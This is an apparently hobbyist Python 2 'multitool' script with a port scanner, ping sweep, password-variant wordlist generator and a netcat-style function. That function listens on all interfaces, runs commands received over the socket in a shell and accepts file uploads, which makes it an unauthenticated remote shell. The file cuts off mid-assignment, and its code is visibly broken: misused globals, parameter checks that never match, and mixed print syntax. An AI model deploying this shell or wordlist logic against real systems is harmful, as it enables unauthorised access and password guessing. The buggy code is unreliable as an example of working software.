# The entire Multitool function is designed for Python 2.X; needs to be updated for Python 3.X!
# Specify OS via input to determine path to command shell
# Specify CMD or Powershell via input
# Implement Windows version for ping and replace -c with -n, otherwise ping won't work on Windows!
# Network multitool parameters: Input all chosen parameters into the command line, then read from stdin and process the input!

import sys
import socket
import subprocess
import datetime
import getopt
import threading
import re

def port_scanner(ip, ports):

    for port in range(1, ports):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1000)
            s.connect((ip, port))
            print('Port %d:OPEN' % (port))
            s.close()
        except:
            continue

def ping_sweep():

    network_part = raw_input('Please specify the network part, for example 192.168.0. or 192.168.2. : ')
    range_one = int(input('Please specify the first part of the range you would like to scan: '))
    range_two = int(input('Please specify the second part of the range you would like to scan: '))
    time_one = datetime.datetime.now()

    for ping in range(range_one, range_two):
        adress = network_part + str(ping)
        sweep = subprocess.call(['ping', '-c', '2', adress])
        if sweep == 0:
            print('')
            print('###################')
            print('%s is up.' % (adress))
            print('###################')
            print('')
        elif sweep == 2:
            print('')
            print('##############################')
            print('No response from %s.' % (adress))
            print('##############################')
            print('')
        else:
            print('')
            print('############################')
            print('Ping to %s failed.' % (adress))
            print('############################')
            print('')

    time_two = datetime.datetime.now()
    time_final = time_two - time_one
    print('#########################################')
    print('Completed scan in', time_final, 'seconds.')
    print('#########################################')

def multitool(parameters):
    listen = False
    command = False
    upload = False
    execute = ""
    target = ""
    upload_destination = ""
    port = 0

    def run_command(command):
        command = command.rstrip()

        try:
            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell = True)
        except:
            output = "Failed to execute command.\r\n"

        return output

    def client_handler(client_socket):
            global upload
            global execute
            global command

            if len(upload_destination):

                file_buffer = ""

                while True:
                    data = client_socket.recv(1024)

                    if not data:
                        break
                    else:
                        file_buffer += data

            try:
                    file_descriptor = open(upload_destination,"wb")
                    file_descriptor.write(file_buffer)
                    file_descriptor.close()
                    client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
            except:
                    client_socket.send("Failed to save file to %s\r\n" % upload_destination)

            if len(execute):

                output = run_command(execute)

                client_socket.send(output)

            if command:

                while True:

                    client_socket.send("<RCADE:#> ")

                    cmd_buffer = ""
                    while "\n" not in cmd_buffer:
                            cmd_buffer += client_socket.recv(1024)

                    response = run_command(cmd_buffer)

                    client_socket.send(response)

    def server_loop():
            global target
            global port

            if not len(target):
                target = "0.0.0.0"

            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((target,port))

            server.listen(5)

            while True:
                    client_socket, addr = server.accept()

                    client_thread = threading.Thread(target=client_handler,args=(client_socket,))
                    client_thread.start()

    def client_sender(buffer):

            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                client.connect((target,port))

                if len(buffer):

                    client.send(buffer)

                while True:

                    recv_len = 1
                    response = ""

                    while recv_len:
                            data     = client.recv(4096)
                            recv_len = len(data)
                            response+= data

                            if recv_len < 4096:
                                    break

                    print response,

                    buffer = raw_input("")
                    buffer += "\n"

                    client.send(buffer)


            except:

                    print "[*] Exception! Exiting."

                    client.close()


    def main():
        global listen
        global port
        global execute
        global command
        global upload_destination
        global target
        global parameters


        while "Done" not in {parameters}:
            if "-l" in {parameters}:
                listen = True
                parameters = raw_input("Please enter another parameter: ")
            elif "-c" in {parameters}:
                command = True
                parameters = raw_input("Please enter another parameter: ")
            elif "-u" in {parameters}:
                upload = True
                upload_destination = raw_input("Please enter an upload destination: ")
                parameters = raw_input("Please enter another parameter: ")
            elif "-e" in {parameters}:
                execute = raw_input("Please enter a command to be executed: ")
                parameters = raw_input("Please enter another parameter: ")
            elif "-p" in {parameters}:
                port = int(input("Please enter a port: "))
                parameters = raw_input("Please enter another parameter: ")
            elif "-t" in {parameters}:
                target = raw_input("Please enter a target: ")
                parameters = raw_input("Please enter another parameter: ")
            else:
                print "Unknown parameter!"
                parameters = raw_input("Please enter another parameter: ")


        if not listen and len(target) and port > 0:

            buffer = sys.stdin.read()

            client_sender(buffer)

        if listen:
            server_loop()


    main()

def pass_generator():
    print("You are able to input up to three strings")
    # Ammount of User input
    ammount = int(input("How many strings would you like to input? 1, 2 or 3: "))
    # Write user input
    write_user_input = raw_input("Would you like to create a password file? Yes or No: ")
    # Path user input
    if write_user_input == "Yes":
        print("If the file already exists any content will be overwritten!")
        path = raw_input("Please specify a path for the password file: ")
    # Getting user input
    if ammount == 1:
        user_input_1 = raw_input("Please enter the first string: ")
        user_input_1 = user_input_1
    elif ammount == 2:
        user_input_1 = raw_input("Please enter the first string: ")
        user_input_2 = raw_input("Please enter the second string: ")
    elif ammount == 3:
        user_input_1 = raw_input("Please enter the first string: ")
        user_input_2 = raw_input("Please enter the second string: ")
        user_input_3 = raw_input("Please enter the third string: ")
    # Modifying strings
    # 1 string
    # User input 1
    if ammount == 1:
        user_input_1 = user_input_1.strip()
        pass_1_upper = user_input_1.upper()
        pass_1_lower = user_input_1.lower()
        pass_1_title = user_input_1.title()
        pass_1_capitalize = user_input_1.capitalize()
        pass_1_swapcase = user_input_1.swapcase()
        pass_1_colon = ":".join(user_input_1)
        pass_1_dot = ".".join(user_input_1)
        pass_1_space = " ".join(user_input_1)
        pass_1_underscore = "_".join(user_input_1)
        pass_1_reverse = user_input_1[::-1]
        pass_1_upper_reverse = user_input_1.upper()[::-1]
        pass_1_lower_reverse = user_input_1.lower()[::-1]
        pass_1_title_reverse = user_input_1.title()[::-1]
        pass_1_capitalize_reverse = user_input_1.capitalize()[::-1]
        pass_1_swapcase_reverse = user_input_1.swapcase()[::-1]
        pass_1_colon_reverse = ":".join(user_input_1)[::-1]
        pass_1_dot_reverse = ".".join(user_input_1)[::-1]
        pass_1_space_reverse = " ".join(user_input_1)[::-1]
        pass_1_underscore_reverse = "_".join(user_input_1)[::-1]
        print("Potential passwords: ")
        print(user_input_1)
        print(pass_1_upper)
        print(pass_1_lower)
        print(pass_1_title)
        print(pass_1_capitalize)
        print(pass_1_swapcase)
        print(pass_1_colon)
        print(pass_1_dot)
        print(pass_1_space)
        print(pass_1_underscore)
        print(pass_1_reverse)
        print(pass_1_upper_reverse)
        print(pass_1_lower_reverse)
        print(pass_1_title_reverse)
        print(pass_1_capitalize_reverse)
        print(pass_1_swapcase_reverse)
        print(pass_1_colon_reverse)
        print(pass_1_dot_reverse)
        print(pass_1_space_reverse)
        print(pass_1_underscore_reverse)
    # Write to a file
        if write_user_input == "Yes":
            fobj = open(path, 'w')
            fobj.write(user_input_1 + "\n")
            fobj.write(pass_1_upper + "\n")
            fobj.write(pass_1_lower + "\n")
            fobj.write(pass_1_title + "\n")
            fobj.write(pass_1_capitalize + "\n")
            fobj.write(pass_1_swapcase + "\n")
            fobj.write(pass_1_colon + "\n")
            fobj.write(pass_1_dot + "\n")
            fobj.write(pass_1_space + "\n")
            fobj.write(pass_1_underscore + "\n")
            fobj.write(pass_1_reverse + "\n")
            fobj.write(pass_1_upper_reverse + "\n")
            fobj.write(pass_1_lower_reverse + "\n")
            fobj.write(pass_1_title_reverse + "\n")
            fobj.write(pass_1_capitalize_reverse + "\n")
            fobj.write(pass_1_swapcase_reverse + "\n")
            fobj.write(pass_1_colon_reverse + "\n")
            fobj.write(pass_1_dot_reverse + "\n")
            fobj.write(pass_1_space_reverse + "\n")
            fobj.write(pass_1_underscore_reverse + "\n")
    # 2 strings
    # User input 1
    elif ammount == 2:
        user_input_1 = user_input_1.strip()
        pass_1_upper = user_input_1.upper()
        pass_1_lower = user_input_1.lower()
        pass_1_title = user_input_1.title()
        pass_1_capitalize = user_input_1.capitalize()
        pass_1_swapcase = user_input_1.swapcase()
        pass_1_colon = ":".join(user_input_1)
        pass_1_dot = ".".join(user_input_1)
        pass_1_space = " ".join(user_input_1)
        pass_1_underscore = "_".join(user_input_1)
        pass_1_reverse = user_input_1[::-1]
        pass_1_upper_reverse = user_input_1.upper()[::-1]
        pass_1_lower_reverse = user_input_1.lower()[::-1]
        pass_1_title_reverse = user_input_1.title()[::-1]
        pass_1_capitalize_reverse = user_input_1.capitalize()[::-1]
        pass_1_swapcase_reverse = user_input_1.swapcase()[::-1]
        pass_1_colon_reverse = ":".join(user_input_1)[::-1]
        pass_1_dot_reverse = ".".join(user_input_1)[::-1]
        pass_1_space_reverse = " ".join(user_input_1)[::-1]
        pass_1_underscore_reverse = "_".join(user_input_1)[::-1]
    # User input 2
        user_input_2 = user_input_2.strip()
        pass_2_upper = user_input_2.upper()
        pass_2_lower = user_input_2.lower()
        pass_2_title = user_input_2.title()
        pass_2_capitalize = user_input_2.capitalize()
        pass_2_swapcase = user_input_2.swapcase()
        pass_2_colon = ":".join(user_input_2)
        pass_2_dot = ".".join(user_input_2)
        pass_2_space = " ".join(user_input_2)
        pass_2_underscore = "_".join(user_input_2)
        pass_2_reverse = user_input_2[::-1]
        pass_2_upper_reverse = user_input_2.upper()[::-1]
        pass_2_lower_reverse = user_input_2.lower()[::-1]
        pass_2_title_reverse = user_input_2.title()[::-1]
        pass_2_capitalize_reverse = user_input_2.capitalize()[::-1]
        pass_2_swapcase_reverse = user_input_2.swapcase()[::-1]
        pass_2_colon_reverse = ":".join(user_input_2)[::-1]
        pass_2_dot_reverse = ".".join(user_input_2)[::-1]
        pass_2_space_reverse = " ".join(user_input_2)[::-1]
        pass_2_underscore_reverse = "_".join(user_input_2)[::-1]
    # User input 1 + user input 2
        pass_1_2 = user_input_1 + user_input_2
        pass_1_2_upper = user_input_1.upper() + user_input_2.upper()
        pass_1_2_lower = user_input_1.lower() + user_input_2.lower()
        pass_1_2_title = user_input_1.title() + user_input_2.title()
        pass_1_2_capitalize = user_input_1.capitalize() + user_input_2.capitalize()
        pass_1_2_swapcase = user_input_1.swapcase() + user_input_2.swapcase()
        pass_1_2_colon = ":".join(user_input_1) + ":".join(user_input_2)
        pass_1_2_dot = ".".join(user_input_1) + ".".join(user_input_2)
        pass_1_2_space = " ".join(user_input_1) + " ".join(user_input_2)
        pass_1_2_underscore = "_".join(user_input_1) + "_".join(user_input_2)
        pass_1_2_reverse = user_input_1[::-1] + user_input_2[::-1]
        pass_1_2_upper_reverse = user_input_1.upper()[::-1] + user_input_2.upper()[::-1]
        pass_1_2_lower_reverse = user_input_1.lower()[::-1] + user_input_2.lower()[::-1]
        pass_1_2_title_reverse = user_input_1.title()[::-1] + user_input_2.title()[::-1]
        pass_1_2_capitalize_reverse = user_input_1.capitalize()[::-1] + user_input_2.capitalize()[::-1]
        pass_1_2_swapcase_reverse = user_input_1.swapcase()[::-1] + user_input_2.swapcase()[::-1]
        pass_1_2_colon_reverse = ":".join(user_input_1)[::-1] + ":".join(user_input_2)[::-1]
        pass_1_2_dot_reverse = ".".join(user_input_1)[::-1] + ".".join(user_input_2)[::-1]
        pass_1_2_space_reverse = " ".join(user_input_1)[::-1] + " ".join(user_input_2)[::-1]
        pass_1_2_underscore_reverse = "_".join(user_input_1)[::-1] + "_".join(user_input_2)[::-1]
    # User input 2 + 1
        pass_2_1 = user_input_2 + user_input_1
        pass_2_1_upper = user_input_2.upper() + user_input_1.upper()
        pass_2_1_lower = user_input_2.lower() + user_input_1.lower()
        pass_2_1_title = user_input_2.title() + user_input_1.title()
        pass_2_1_capitalize = user_input_2.capitalize() + user_input_1.capitalize()
        pass_2_1_swapcase = user_input_2.swapcase() + user_input_1.swapcase()
        pass_2_1_colon = ":".join(user_input_2) + ":".join(user_input_1)
        pass_2_1_dot = ".".join(user_input_2) + ".".join(user_input_1)
        pass_2_1_space = " ".join(user_input_2) + " ".join(user_input_1)
        pass_2_1_underscore = "_".join(user_input_2) + "_".join(user_input_1)
        pass_2_1_reverse = user_input_2[::-1] + user_input_2[::-1]
        pass_2_1_upper_reverse = user_input_2.upper()[::-1] + user_input_1.upper()[::-1]
        pass_2_1_lower_reverse = user_input_2.lower()[::-1] + user_input_1.lower()[::-1]
        pass_2_1_title_reverse = user_input_2.title()[::-1] + user_input_1.title()[::-1]
        pass_2_1_capitalize_reverse = user_input_2.capitalize()[::-1] + user_input_1.capitalize()[::-1]
        pass_2_1_swapcase_reverse = user_input_2.swapcase()[::-1] + user_input_1.swapcase()[::-1]
        pass_2_1_colon_reverse = ":".join(user_input_2)[::-1] + ":".join(user_input_1)[::-1]
        pass_2_1_dot_reverse = ".".join(user_input_2)[::-1] + ".".join(user_input_1)[::-1]
        pass_2_1_space_reverse = " ".join(user_input_2)[::-1] + " ".join(user_input_1)[::-1]
        pass_2_1_underscore_reverse = "_".join(user_input_2)[::-1] + "_".join(user_input_1)[::-1]
        print("Potential passwords: ")
        print(user_input_1)
        print(pass_1_upper)
        print(pass_1_lower)
        print(pass_1_title)
        print(pass_1_capitalize)
        print(pass_1_swapcase)
        print(pass_1_colon)
        print(pass_1_dot)
        print(pass_1_space)
        print(pass_1_underscore)
        print(pass_1_reverse)
        print(pass_1_upper_reverse)
        print(pass_1_lower_reverse)
        print(pass_1_title_reverse)
        print(pass_1_capitalize_reverse)
        print(pass_1_swapcase_reverse)
        print(pass_1_colon_reverse)
        print(pass_1_dot_reverse)
        print(pass_1_space_reverse)
        print(pass_1_underscore_reverse)
        print(user_input_2)
        print(pass_2_upper)
        print(pass_2_lower)
        print(pass_2_title)
        print(pass_2_capitalize)
        print(pass_2_swapcase)
        print(pass_2_colon)
        print(pass_2_dot)
        print(pass_2_space)
        print(pass_2_underscore)
        print(pass_2_reverse)
        print(pass_2_upper_reverse)
        print(pass_2_lower_reverse)
        print(pass_2_title_reverse)
        print(pass_2_capitalize_reverse)
        print(pass_2_swapcase_reverse)
        print(pass_2_colon_reverse)
        print(pass_2_dot_reverse)
        print(pass_2_space_reverse)
        print(pass_2_underscore_reverse)
        print(pass_1_2)
        print(pass_1_2_upper)
        print(pass_1_2_lower)
        print(pass_1_2_title)
        print(pass_1_2_capitalize)
        print(pass_1_2_swapcase)
        print(pass_1_2_colon)
        print(pass_1_2_dot)
        print(pass_1_2_space)
        print(pass_1_2_underscore)
        print(pass_1_2_reverse)
        print(pass_1_2_upper_reverse)
        print(pass_1_2_lower_reverse)
        print(pass_1_2_title_reverse)
        print(pass_1_2_capitalize_reverse)
        print(pass_1_2_swapcase_reverse)
        print(pass_1_2_colon_reverse)
        print(pass_1_2_dot_reverse)
        print(pass_1_2_space_reverse)
        print(pass_1_2_underscore_reverse)
        print(pass_2_1)
        print(pass_2_1_upper)
        print(pass_2_1_lower)
        print(pass_2_1_title)
        print(pass_2_1_capitalize)
        print(pass_2_1_swapcase)
        print(pass_2_1_colon)
        print(pass_2_1_dot)
        print(pass_2_1_space)
        print(pass_2_1_underscore)
        print(pass_2_1_reverse)
        print(pass_2_1_upper_reverse)
        print(pass_2_1_lower_reverse)
        print(pass_2_1_title_reverse)
        print(pass_2_1_capitalize_reverse)
        print(pass_2_1_swapcase_reverse)
        print(pass_2_1_colon_reverse)
        print(pass_2_1_dot_reverse)
        print(pass_2_1_space_reverse)
        print(pass_2_1_underscore_reverse)
    # Write to a file
        if write_user_input == "Yes":
            fobj = open(path, 'w')
            fobj.write(user_input_1 + "\n")
            fobj.write(pass_1_upper + "\n")
            fobj.write(pass_1_lower + "\n")
            fobj.write(pass_1_title + "\n")
            fobj.write(pass_1_capitalize + "\n")
            fobj.write(pass_1_swapcase + "\n")
            fobj.write(pass_1_colon + "\n")
            fobj.write(pass_1_dot + "\n")
            fobj.write(pass_1_space + "\n")
            fobj.write(pass_1_underscore + "\n")
            fobj.write(pass_1_reverse + "\n")
            fobj.write(pass_1_upper_reverse + "\n")
            fobj.write(pass_1_lower_reverse + "\n")
            fobj.write(pass_1_title_reverse + "\n")
            fobj.write(pass_1_capitalize_reverse + "\n")
            fobj.write(pass_1_swapcase_reverse + "\n")
            fobj.write(pass_1_colon_reverse + "\n")
            fobj.write(pass_1_dot_reverse + "\n")
            fobj.write(pass_1_space_reverse + "\n")
            fobj.write(pass_1_underscore_reverse + "\n")
            fobj.write(user_input_2 + "\n")
            fobj.write(pass_2_upper + "\n")
            fobj.write(pass_2_lower + "\n")
            fobj.write(pass_2_title + "\n")
            fobj.write(pass_2_capitalize + "\n")
            fobj.write(pass_2_swapcase + "\n")
            fobj.write(pass_2_colon + "\n")
            fobj.write(pass_2_dot + "\n")
            fobj.write(pass_2_space + "\n")
            fobj.write(pass_2_underscore + "\n")
            fobj.write(pass_2_reverse + "\n")
            fobj.write(pass_2_upper_reverse + "\n")
            fobj.write(pass_2_lower_reverse + "\n")
            fobj.write(pass_2_title_reverse + "\n")
            fobj.write(pass_2_capitalize_reverse + "\n")
            fobj.write(pass_2_swapcase_reverse + "\n")
            fobj.write(pass_2_colon_reverse + "\n")
            fobj.write(pass_2_dot_reverse + "\n")
            fobj.write(pass_2_space_reverse + "\n")
            fobj.write(pass_2_underscore_reverse + "\n")
            fobj.write(pass_1_2 + "\n")
            fobj.write(pass_1_2_upper + "\n")
            fobj.write(pass_1_2_lower + "\n")
            fobj.write(pass_1_2_title + "\n")
            fobj.write(pass_1_2_capitalize + "\n")
            fobj.write(pass_1_2_swapcase + "\n")
            fobj.write(pass_1_2_colon + "\n")
            fobj.write(pass_1_2_dot + "\n")
            fobj.write(pass_1_2_space + "\n")
            fobj.write(pass_1_2_underscore + "\n")
            fobj.write(pass_1_2_reverse + "\n")
            fobj.write(pass_1_2_upper_reverse + "\n")
            fobj.write(pass_1_2_lower_reverse + "\n")
            fobj.write(pass_1_2_title_reverse + "\n")
            fobj.write(pass_1_2_capitalize_reverse + "\n")
            fobj.write(pass_1_2_swapcase_reverse + "\n")
            fobj.write(pass_1_2_colon_reverse + "\n")
            fobj.write(pass_1_2_dot_reverse + "\n")
            fobj.write(pass_1_2_space_reverse + "\n")
            fobj.write(pass_1_2_underscore_reverse + "\n")
            fobj.write(pass_2_1 + "\n")
            fobj.write(pass_2_1_upper + "\n")
            fobj.write(pass_2_1_lower + "\n")
            fobj.write(pass_2_1_title + "\n")
            fobj.write(pass_2_1_capitalize + "\n")
            fobj.write(pass_2_1_swapcase + "\n")
            fobj.write(pass_2_1_colon + "\n")
            fobj.write(pass_2_1_dot + "\n")
            fobj.write(pass_2_1_space + "\n")
            fobj.write(pass_2_1_underscore + "\n")
            fobj.write(pass_2_1_reverse + "\n")
            fobj.write(pass_2_1_upper_reverse + "\n")
            fobj.write(pass_2_1_lower_reverse + "\n")
            fobj.write(pass_2_1_title_reverse + "\n")
            fobj.write(pass_2_1_capitalize_reverse + "\n")
            fobj.write(pass_2_1_swapcase_reverse + "\n")
            fobj.write(pass_2_1_colon_reverse + "\n")
            fobj.write(pass_2_1_dot_reverse + "\n")
            fobj.write(pass_2_1_space_reverse + "\n")
            fobj.write(pass_2_1_underscore_reverse + "\n")
    # 3 strings
    # User input 1
    elif ammount == 3:
        user_input_1 = user_input_1.strip()
        pass_1_upper = user_input_1.upper()
        pass_1_lower = user_input_1.lower()
        pass_1_title = user_input_1.title()
        pass_1_capitalize = user_input_1.capitalize()
        pass_1_swapcase = user_input_1.swapcase()
        pass_1_colon = ":".join(user_input_1)
        pass_1_dot = ".".join(user_input_1)
        pass_1_space = " ".join(user_input_1)
        pass_1_underscore = "_".join(user_input_1)
        pass_1_reverse = user_input_1[::-1]
        pass_1_upper_reverse = user_input_1.upper()[::-1]
        pass_1_lower_reverse = user_input_1.lower()[::-1]
        pass_1_title_reverse = user_input_1.title()[::-1]
        pass_1_capitalize_reverse = user_input_1.capitalize()[::-1]
        pass_1_swapcase_reverse = user_input_1.swapcase()[::-1]
        pass_1_colon_reverse = ":".join(user_input_1)[::-1]
        pass_1_dot_reverse = ".".join(user_input_1)[::-1]
        pass_1_space_reverse = " ".join(user_input_1)[::-1]
        pass_1_underscore_reverse = "_".join(user_input_1)[::-1]
    # User input 2
        user_input_2 = user_input_2.strip()
        pass_2_upper = user_input_2.upper()
        pass_2_lower = user_input_2.lower()
        pass_2_title = user_input_2.title()
        pass_2_capitalize = user_input_2.capitalize()
        pass_2_swapcase = user_input_2.swapcase()
        pass_2_colon = ":".join(user_input_2)
        pass_2_dot = ".".join(user_input_2)
        pass_2_space = " ".join(user_input_2)
        pass_2_underscore = "_".join(user_input_2)
        pass_2_reverse = user_input_2[::-1]
        pass_2_upper_reverse = user_input_2.upper()[::-1]
        pass_2_lower_reverse = user_input_2.lower()[::-1]
        pass_2_title_reverse = user_input_2.title()[::-1]
        pass_2_capitalize_reverse = user_input_2.capitalize()[::-1]
        pass_2_swapcase_reverse = user_input_2.swapcase()[::-1]
        pass_2_colon_reverse = ":".join(user_input_2)[::-1]
        pass_2_dot_reverse = ".".join(user_input_2)[::-1]
        pass_2_space_reverse = " ".join(user_input_2)[::-1]
        pass_2_underscore_reverse = "_".join(user_input_2)[::-1]
    # User input 3
        user_input_3 = user_input_3.strip()
        pass_3_upper = user_input_3.upper()
        pass_3_lower = user_input_3.lower()
        pass_3_title = user_input_3.title()
        pass_3_capitalize = user_input_3.capitalize()
        pass_3_swapcase = user_input_3.swapcase()
        pass_3_colon = ":".join(user_input_3)
        pass_3_dot = ".".join(user_input_3)
        pass_3_space = " ".join(user_input_3)
        pass_3_underscore = "_".join(user_input_3)
        pass_3_reverse = user_input_3[::-1]
        pass_3_upper_reverse = user_input_3.upper()[::-1]
        pass_3_lower_reverse = user_input_3.lower()[::-1]
        pass_3_title_reverse = user_input_3.title()[::-1]
        pass_3_capitalize_reverse = user_input_3.capitalize()[::-1]
        pass_3_swapcase_reverse = user_input_3.swapcase()[::-1]
        pass_3_colon_reverse = ":".join(user_input_3)[::-1]
        pass_3_dot_reverse = ".".join(user_input_3)[::-1]
        pass_3_space_reverse = " ".join(user_input_3)[::-1]
        pass_3_underscore_reverse = "_".join(user_input_3)[::-1]
    # User input 1 + user input 2
        pass_1_2 = user_input_1 + user_input_2
        pass_1_2_upper = user_input_1.upper() + user_input_2.upper()
        pass_1_2_lower = user_input_1.lower() + user_input_2.lower()
        pass_1_2_title = user_input_1.title() + user_input_2.title()
        pass_1_2_capitalize = user_input_1.capitalize() + user_input_2.capitalize()
        pass_1_2_swapcase = user_input_1.swapcase() + user_input_2.swapcase()
        pass_1_2_colon = ":".join(user_input_1) + ":".join(user_input_2)
        pass_1_2_dot = ".".join(user_input_1) + ".".join(user_input_2)
        pass_1_2_space = " ".join(user_input_1) + " ".join(user_input_2)
        pass_1_2_underscore = "_".join(user_input_1) + "_".join(user_input_2)
        pass_1_2_reverse = user_input_1[::-1] + user_input_2[::-1]
        pass_1_2_upper_reverse = user_input_1.upper()[::-1] + user_input_2.upper()[::-1]
        pass_1_2_lower_reverse = user_input_1.lower()[::-1] + user_input_2.lower()[::-1]
        pass_1_2_title_reverse = user_input_1.title()[::-1] + user_input_2.title()[::-1]
        pass_1_2_capitalize_reverse = user_input_1.capitalize()[::-1] + user_input_2.capitalize()[::-1]
        pass_1_2_swapcase_reverse = user_input_1.swapcase()[::-1] + user_input_2.swapcase()[::-1]
        pass_1_2_colon_reverse = ":".join(user_input_1)[::-1] + ":".join(user_input_2)[::-1]
        pass_1_2_dot_reverse = ".".join(user_input_1)[::-1] + ".".join(user_input_2)[::-1]
        pass_1_2_space_reverse = " ".join(user_input_1)[::-1] + " ".join(user_input_2)[::-1]
        pass_1_2_underscore_reverse = "_".join(user_input_1)[::-1] + "_".join(user_input_2)[::-1]
    # User input 1 + user input 3
        pass_1_3 = user_input_1 + user_input_3
        pass_1_3_upper = user_input_1.upper() + user_input_3.upper()
        pass_1_3_lower = user_input_1.lower() + user_input_3.lower()
        pass_1_3_title = user_input_1.title() + user_input_3.title()
        pass_1_3_capitalize = user_input_1.capitalize() + user_input_3.capitalize()
        pass_1_3_swapcase = user_input_1.swapcase() + user_input_3.swapcase()
        pass_1_3_colon = ":".join(user_input_1) + ":".join(user_input_3)
        pass_1_3_dot = ".".join(user_input_1) + ".".join(user_input_3)
        pass_1_3_space = " ".join(user_input_1) + " ".join(user_input_3)
        pass_1_3_underscore = "_".join(user_input_1) + "_".join(user_input_3)
        pass_1_3_reverse = user_input_1[::-1] + user_input_3[::-1]
        pass_1_3_upper_reverse = user_input_1.upper()[::-1] + user_input_3.upper()[::-1]
        pass_1_3_lower_reverse = user_input_1.lower()[::-1] + user_input_3.lower()[::-1]
        pass_1_3_title_reverse = user_input_1.title()[::-1] + user_input_3.title()[::-1]
        pass_1_3_capitalize_reverse = user_input_1.capitalize()[::-1] + user_input_3.capitalize()[::-1]
        pass_1_3_swapcase_reverse = user_input_1.swapcase()[::-1] + user_input_3.swapcase()[::-1]
        pass_1_3_colon_reverse = ":".join(user_input_1)[::-1] + ":".join(user_input_3)[::-1]
        pass_1_3_dot_reverse = ".".join(user_input_1)[::-1] + ".".join(user_input_3)[::-1]
        pass_1_3_space_reverse = " ".join(user_input_1)[::-1] + " ".join(user_input_3)[::-1]
        pass_1_3_underscore_reverse = "_".join(user_input_1)[::-1] + "_".join(user_input_3)[::-1]
    # User input 2 + user input 1
        pass_2_1 = user_input_2 + user_input_1
        pass_2_1_upper = user_input_2.upper() + user_input_1.upper()
        pass_2_1_lower = user_input_2.lower() + user_input_1.lower()
        pass_2_1_title = user_input_2.title() + user_input_1.title()
        pass_2_1_capitalize = user_input_2.capitalize() + user_input_1.capitalize()
        pass_2_1_swapcase = user_input_2.swapcase() + user_input_1.swapcase()
        pass_2_1_colon = ":".join(user_input_2) + ":".join(user_input_1)
        pass_2_1_dot = ".".join(user_input_2) + ".".join(user_input_1)
        pass_2_1_space = " ".join(user_input_2) + " ".join(user_input_1)
        pass_2_1_underscore = "_".join(user_input_2) + "_".join(user_input_1)
        pass_2_1_reverse = user_input_2[::-1] + user_input_1[::-1]
        pass_2_1_upper_reverse = user_input_2.upper()[::-1] + user_input_1.upper()[::-1]
        pass_2_1_lower_reverse = user_input_2.lower()[::-1] + user_input_1.lower()[::-1]
        pass_2_1_title_reverse = user_input_2.title()[::-1] + user_input_1.title()[::-1]
        pass_2_1_capitalize_reverse = user_input_2.capitalize()[::-1] + user_input_1.capitalize()[::-1]
        pass_2_1_swapcase_reverse = user_input_2.swapcase()[::-1] + user_input_1.swapcase()[::-1]
        pass_2_1_colon_reverse = ":".join(user_input_2)[::-1] + ":".join(user_input_1)[::-1]
        pass_2_1_dot_reverse = ".".join(user_input_2)[::-1] + ".".join(user_input_1)[::-1]
        pass_2_1_space_reverse = " ".join(user_input_2)[::-1] + " ".join(user_input_1)[::-1]
        pass_2_1_underscore_reverse = "_".join(user_input_2)[::-1] + "_".join(user_input_1)[::-1]
    # User input 2 + user input 3
        pass_2_3 = user_input_2 + user_input_3
        pass_2_3_upper = user_input_2.upper() + user_input_3.upper()
        pass_2_3_lower = user_input_2.lower() + user_input_3.lower()
        pass_2_3_title = user_input_2.title() + user_input_3.title()
        pass_2_3_capitalize = user_input_2.capitalize() + user_input_3.capitalize()
        pass_2_3_swapcase = user_input_2.swapcase() + user_input_3.swapcase()
        pass_2_3_colon = ":".join(user_input_2) + ":".join(user_input_3)
        pass_2_3_dot = ".".join(user_input_2) + ".".join(user_input_3)
        pass_2_3_space = " ".join(user_input_2) + " ".join(user_input_3)
        pass_2_3_underscore = "_".join(user_input_2) + "_".join(user_input_3)
        pass_2_3_reverse = user_input_2[::-1] + user_input_3[::-1]
        pass_2_3_upper_reverse = user_input_2.upper()[::-1] + user_input_3.upper()[::-1]
        pass_2_3_lower_reverse = user_input_2.lower()[::-1] + user_input_3.lower()[::-1]
        pass_2_3_title_reverse = user_input_2.title()[::-1] + user_input_3.title()[::-1]
        pass_2_3_capitalize_reverse = user_input_2.capitalize()[::-1] + user_input_3.capitalize()[::-1]
        pass_2_3_swapcase_reverse = user_input_2.swapcase()[::-1] + user_input_3.swapcase()[::-1]
        pass_2_3_colon_reverse = ":".join(user_input_2)[::-1] + ":".join(user_input_3)[::-1]
        pass_2_3_dot_reverse = ".".join(user_input_2)[::-1] + ".".join(user_input_3)[::-1]
        pass_2_3_space_reverse = " ".join(user_input_2)[::-1] + " ".join(user_input_3)[::-1]
        pass_2_3_underscore_reverse = "_".join(user_input_2)[::-1] + "_".join(user_input_3)[::-1]
    # User input 3 + user input 1
        pass_3_1 = user_input_3 + user_input_1
        pass_3_1_upper = user_input_3.upper() + user_input_1.upper()
        pass_3_1_lower = user_input_3.lower() + user_input_1.lower()
        pass_3_1_title = user_input_3.title() + user_input_1.title()
        pass_3_1_capitalize = user_input_3.capitalize() + user_input_1.capitalize()
        pass_3_1_swapcase = user_input_3.swapcase() + user_input_1.swapcase()
        pass_3_1_colon = ":".join(user_input_3) + ":".join(user_input_1)
        pass_3_1_dot = ".".join(user_input_3) + ".".join(user_input_1)
        pass_3_1_space = " ".join(user_input_3) + " ".join(user_input_1)
        pass_3_1_underscore = "_".join(user_input_3) + "_".join(user_input_1)
        pass_3_1_reverse = user_input_3[::-1] + user_input_1[::-1]
        pass_3_1_upper_reverse = user_input_3.upper()[::-1] + user_input_1.upper()[::-1]
        pass_3_1_lower_reverse = user_input_3.lower()[::-1] + user_input_1.lower()[::-1]
        pass_3_1_title_reverse = user_input_3.title()[::-1] + user_input_1.title()[::-1]
        pass_3_1_capitalize_reverse = user_input_3.capitalize()[::-1] + user_input_1.capitalize()[::-1]
        pass_3_1_swapcase_reverse = user_input_3.swapcase()[::-1] + user_input_1.swapcase()[::-1]
        pass_3_1_colon_reverse = ":".join(user_input_3)[::-1] + ":".join(user_input_1)[::-1]
        pass_3_1_dot_reverse = ".".join(user_input_3)[::-1] + ".".join(user_input_1)[::-1]
        pass_3_1_space_reverse = " ".join(user_input_3)[::-1] + " ".join(user_input_1)[::-1]
        pass_3_1_underscore_reverse = "_".join(user_input_3)[::-1] + "_".join(user_input_1)[::-1]
    # User input 3 + user input 2
        pass_3_2 = user_input_3 + user_input_2
